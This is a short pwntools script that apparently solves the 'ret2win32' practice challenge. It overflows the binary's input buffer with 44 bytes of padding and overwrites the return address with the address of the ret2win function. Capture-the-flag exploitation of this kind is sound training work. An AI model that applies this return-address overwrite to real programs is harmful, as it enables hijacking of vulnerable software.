from pwn import *

context.log_level = "debug"
context.terminal = ["wezterm", "start", "--"]

bin = b"./ret2win32"
p = process(bin)
# gdb.attach(p, api=True)
e = ELF(bin)
rop = ROP(e)

ret2win = e.symbols["ret2win"]

payload = b"A" * 44  # laaa
payload += p32(ret2win)

p.sendafter(b"> ", payload)
p.recvline()
p.recvline()
p.recvline()
